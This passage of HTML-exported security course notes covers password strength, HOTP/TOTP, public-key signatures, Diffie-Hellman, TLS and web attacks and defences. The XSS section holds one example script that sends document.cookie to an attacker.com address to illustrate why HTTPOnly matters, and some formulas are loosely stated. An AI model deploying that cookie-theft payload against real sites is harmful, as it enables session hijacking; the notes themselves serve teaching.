entropy</span></p><ul><li><p><span>Formula: </span><code>H = log2(N^L)</code></p></li></ul></li><li><p><span>Consider alpha-numerical random passwords</span></p></li></ul></li><li><p><span>How to improve the strength of password</span></p><ul><li><p><span>Password policies</span></p></li><li><p><span>Password-strength meters</span></p></li></ul></li><li><p><span>Threats to password security</span></p><ul><li><p><span>Phishing attacks</span></p></li><li><p><span>Shoulder surfing (observation)</span></p></li><li><p><span>Poor implementation / deployment</span></p></li><li><p><span>Online attack against live system</span></p><ul><li><p><span>Rate-limiting</span></p></li></ul></li><li><p><span>Attack against password-protected file</span></p></li><li><p><span>Offline attack against stolen database</span></p></li></ul></li><li><p><span>HOTP/TOTP</span></p><ul><li><p><code>HOTP (K, C) = HMAC k (C)</code></p><ul><li><p><span>C is a counter, incremented each time</span></p></li></ul></li><li><p><span>In TOTP, </span><code>C = | T / Tx |</code></p><ul><li><p><span>T: Current Timestamp</span></p></li><li><p><span>Tx: length of one time duration </span></p></li></ul></li><li><p><span>Disadvantages</span></p><ul><li><p><span>Plaintext Code</span></p></li><li><p><span>User need to verify the domain</span></p></li><li><p><span>Maybe have Man-in-the-middle attack</span></p></li><li><p><span>Shared Secret don&#39;t know Server side store in plaintext or cipher text</span></p></li></ul></li></ul></li><li><p><span>FIDO2</span></p></li></ul><h2 id='4-authentication-protocols'><span>4 Authentication Protocols</span></h2><h3 id='41--public-key-cryptography'><span>4.1  Public Key Cryptography</span></h3><ul><li><p><span>Problems with symmetric keys</span></p><ul><li><p><span>Pre-share key with intended recipient -&gt; not practical</span></p></li><li><p><span>Make sure the key is not intercepted -&gt; difficult</span></p></li><li><p><span>One symmetric key by pair of (sender, recipient) -&gt; not scalable</span></p></li></ul></li><li><p><span>Public-key cryptography</span></p><ul><li><p><span>Encryption/decryption</span></p></li><li><p><span>Digital signature</span></p></li><li><p><span>Key exchange</span></p></li></ul></li><li><p><span>Public key (asymmetric) encryption</span></p><ul><li><p><span>Each party has a pair of keys: a public key P, and a secret (or private) key S</span></p></li><li><p><code>DEC s (ENC p (M)) = M</code></p></li></ul></li><li><p><span>Key pair generation</span></p><ul><li><p><code>pk = KeyGen(sk)</code></p></li><li><p><span>sk: must remain secret to the signer</span></p></li><li><p><span>pk: is the public key, it is meant to be distributed</span></p></li><li><p><span>KeyGen easy to compute</span></p></li></ul></li><li><p><span>Man-in-the-middle attack</span></p><p><img src="./img/4_1_1.png" referrerpolicy="no-referrer" alt="4_1_1"></p></li><li><p><span>Signing</span></p><ul><li><p><code>σ = sign(m, sk, r)</code></p></li><li><p><span>sign is deterministic</span></p><ul><li><p><span>Despite r</span></p><ul><li><p><span>Given the same {m, sk, r}, same output</span></p></li></ul></li></ul></li></ul></li><li><p><span>Signature verification</span></p><ul><li><p><code>{T | F} = Verify(m, σ, pk)</code></p><ul><li><p><span>m: Message that was signed</span></p></li><li><p><span>pk: Public Key</span></p></li><li><p><span>σ: Signature to verify, includes r somehow</span></p></li></ul></li></ul></li><li><p><span>Hash &amp; sign</span></p><ul><li><p><span>Message of any size because of one trick</span></p></li><li><p><span>First, take a hash of the message, then sign it</span></p><ul><li><p><code>σ = sign(H(m), sk, r)</code></p></li></ul></li></ul></li><li><p><span>Signing / Verifying</span></p><p><img src="./img/4_1_2.png" referrerpolicy="no-referrer" alt="4_1_2"></p></li></ul><h3 id='42-diffie-hellman-key-exchange'><span>4.2 Diffie-Hellman Key Exchange</span></h3><ul><li><p><span>DH key exchange</span></p><ul><li><p><span>Prior to the key exchange, Alice and Bob agree on a set of parameters</span></p><ul><li><p><span>p -&gt; a large prime integer</span></p></li><li><p><span>g -&gt; a  primitive root mod p</span></p></li><li><p><span>p, g -&gt; both are public</span></p></li></ul></li><li><p><span>Session key is then obtained by both parties calculating</span></p><ul><li><p><code>K AB = g^ab mod p</code></p></li></ul></li><li><p><span>Alice can compute this by</span></p><ul><li><p><code>(g^b)^a mod p</code></p></li></ul></li><li><p><span>Bob can compute this by</span></p><ul><li><p><code>(g^a)^b mod p</code></p></li></ul></li><li><p><span>Eve needs either a or b to compute this key!</span></p><ul><li><p><code>g^a g^b mod p = g^(a+b) mod p</code></p></li></ul></li></ul></li><li><p><span>Man-in-the-middle on DH</span></p><ul><li><p><span>Previous DH key exchange is called anonymous because public parameters g^a and g^b are not authenticated</span></p></li></ul></li></ul><h3 id='43-tls'><span>4.3 TLS</span></h3><ul><li><p><span>SSL and TLS are cryptographic protocols designed to provide secure communication over insecure infrastructure.</span></p></li><li><p><span>Security properties ensured by TLS</span></p><ul><li><p><span>Confidentiality</span></p></li><li><p><span>Message authenticity</span></p></li><li><p><span>Authentication</span></p><ul><li><p><span>Server authentication</span></p></li><li><p><span>Client authentication</span></p></li></ul></li><li><p><span>SSL/TLS do not enforce</span></p><ul><li><p><span>Non--repudiation</span></p></li><li><p><span>Availability</span></p></li></ul></li></ul></li><li><p><span>Overview of TLS</span></p><p><img src="./img/4_3_1.png" referrerpolicy="no-referrer" alt="4_3_1"></p></li><li><p><span>Certificates</span></p><ul><li><p><span>Set of public keys and identification information</span></p></li><li><p><span>Signed by some other source, signatures included in certificate</span></p><ul><li><p><span>Source is normally a trusted third party </span></p></li><li><p><span>Signatures provide integrity and authenticity guarantees</span></p></li><li><p><span>Root certificates are self-signed</span></p></li></ul></li></ul></li><li><p><span>Certificate Authorities (CA)</span></p><ul><li><p><span>CA responsible to verify identity before issuing certificate</span></p></li><li><p><span>Certificates on the web are binding a domain name</span></p></li><li><p><span>TLS is used to secure communications</span></p></li></ul></li><li><p><span>Chain of Trust</span></p><p><img src="./img/4_3_2.png" referrerpolicy="no-referrer" alt="4_3_2"></p></li><li><p><span>Handshake Protocol</span></p><ul><li><p><span>The result is a shared secret (master secret), i.e. Derive into multiple keys for (authenticated) encryption</span></p></li></ul></li><li><p><span>TLS 1.3 handshake simplified</span></p><p><img src="./img/4_3_3.png" referrerpolicy="no-referrer" alt="4_3_3"></p></li></ul><h2 id='5-web-security'><span>5 Web Security</span></h2><h3 id='51-http-authentication'><span>5.1 HTTP Authentication</span></h3><ul><li><p><span>HTTP response header correctly prompts the client to request credentials from the user, to be sent as part of the HTTP Authorization header: </span><code>WWW-Authenticate: Basic realm=&quot;COMP LOGIN&quot;</code></p></li></ul><h3 id='52-sessions'><span>5.2 Sessions</span></h3><ul><li><p><span>Client-side sessions</span></p><ul><li><p><span>The server gives to the user a cookie that includes all the session data</span></p></li></ul></li><li><p><span>Server-side sessions</span></p><ul><li><p><span>Assign to client</span></p></li><li><p><span>Session state includes username, user ID, user privileges, etc.</span></p></li><li><p><span>For example: </span><code>Set-Cookie: PHPSESSID=314b427cf4128539c4b3808f1559d170</code></p></li></ul></li><li><p><span>Session hijacking</span></p><ul><li><p><span>Look 5.3 - 5.5</span></p></li></ul></li></ul><h3 id='53-cookie-security'><span>5.3 Cookie security</span></h3><ul><li><p><span>With Secure flag (Must use HTTPS to visit)</span></p></li></ul><h3 id='54-cross-site-scripting-xss-attack'><span>5.4 Cross-Site Scripting (XSS) attack</span></h3><ul><li><p><span>Use HTTPOnly Flag</span></p></li><li><p><span>If without, attacker can inserts JS script to steal the cookies by grabbing the </span><code>document.cookie</code><span> sends them to his own website</span></p><ul><li><p><span>For example</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-keyword">var</span> <span class="cm-def">i</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-variable">Image</span>();</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">i</span>.<span class="cm-property">src</span><span class="cm-operator">=</span><span class="cm-string">"https://attacker.com/?cookie="</span><span class="cm-operator">+</span> <span class="cm-variable">btoa</span>(<span class="cm-variable">document</span>.<span class="cm-property">cookie</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 96px;"></div><div class="CodeMirror-gutters" style="display: none; height: 96px;"></div></div></div></pre></li></ul></li></ul><h3 id='55-cross-site-request-forgery-csrf-attack'><span>5.5 Cross-Site Request Forgery (CSRF) attack</span></h3><ul><li><p><span>CSRF defense techniques</span></p><ul><li><p><span>Follow REST principles</span></p></li><li><p><span>Anti-CSRF tokens or cookies</span></p></li><li><p><span>SameSite cookie attribute</span></p><ul><li><p><span>strip cookies on a request to your site when the request is generated from an external domain</span></p></li><li><p><span>Add: SameSite=Strict</span></p></li></ul></li></ul></li><li><p><span>The Same Origin Policy</span></p><ul><li><p><span>Policy is an isolation and access control philosophy to isolate documents</span></p></li></ul></li></ul><h3 id='56-subresource-integrity-sri'><span>5.6 Subresource Integrity (SRI)</span></h3><ul><li><p><span>Fetching remote code</span></p><ul><li><p><span>Add source code hash to increase the integrity, and crossorigin</span></p></li><li><p><span>For example</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">// Incorrect</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span> <span class="cm-attribute">src</span>=<span class="cm-string">"https://code.jquery.com/jquery- 3.7.1.min.js"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">// Correct</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span> <span class="cm-attribute">src</span>=<span class="cm-string">"https://code.jquery.com/jquery- 3.7.1.min.js"</span> <span class="cm-attribute">integrity</span>=<span class="cm-string">"sha384- 1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">xXxAvs/HgeFs"</span> <span class="cm-attribute">crossorigin</span>=<span class="cm-string">"anonymous"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 216px;"></div><div class="CodeMirror-gutters" style="display: none; height: 216px;"></div></div></div></pre><p>&nbsp;</p></li></ul></li></ul><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></div></div>
+</body>
+</html>
